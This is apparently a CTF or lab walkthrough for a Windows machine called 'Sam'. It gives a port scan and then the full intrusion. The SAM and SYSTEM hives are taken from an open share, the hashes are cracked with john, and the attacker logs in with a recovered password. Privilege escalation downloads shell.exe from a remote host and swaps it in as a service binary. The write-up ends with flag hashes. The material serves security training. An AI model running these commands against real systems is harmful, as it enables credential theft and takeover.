# Sam

**IP Address:** 172.31.1.18

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services  |
| 445/tcp | open | microsoft-ds | Windows Server 2016 Datacenter 14393 microsoft-ds  |
| 47001/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 49664/tcp | open | msrpc | Microsoft Windows RPC  |
| 49665/tcp | open | msrpc | Microsoft Windows RPC  |
| 49667/tcp | open | msrpc | Microsoft Windows RPC  |
| 49668/tcp | open | msrpc | Microsoft Windows RPC  |
| 49669/tcp | open | msrpc | Microsoft Windows RPC  |
| 49670/tcp | open | msrpc | Microsoft Windows RPC  |
| 49676/tcp | open | msrpc | Microsoft Windows RPC  |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 123/udp | open|filtered | ntp |   |
| 137/udp | open | netbios-ns | Microsoft Windows netbios-ns  |
| 138/udp | open|filtered | netbios-dgm |   |
| 445/udp | open|filtered | microsoft-ds |   |
| 4500/udp | open|filtered | nat-t-ike |   |
| 500/udp | open|filtered | isakmp |   |

## Exploitation
### Exploit Details (Found Credentials)
* **Name** - Found Credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

The SAM & SYSTEM files can be found on a publically available share. The files can then be cracked to reveal a username & password. 

Commands
```
smbclient //$ip/Backups
ls
get SAM
get SYSTEM
/opt/creddump7/pwdump.py SYSTEM SAM > hash.txt
john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
evil-winrm -i $ip -u jamie -p rangers 
type ..\Desktop\access.txt
whoami
```

![Execute Exploit](images/exploit1.png)

## Privilege Escalation
### Exploit Details (Service Permissions)
* **Name** - Service Permissions
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

Commands
```bash
Invoke-WebRequest http://10.10.0.15/shell.exe -OutFile shell.exe
copy shell.exe monitor1.exe
cmd /c "sc start monitor1"
whoami
type C:\Users\Administrator\Desktop\system.txt
```

![Execute Exploit](images/privesc1.png)

![Execute Exploit](images/privesc2.png)

## Loot
```
access.txt
74ae5253abdba3a1769280a36f56e0e8
system.txt
92006a1bd2d08f0908b8634ffcc72a74
```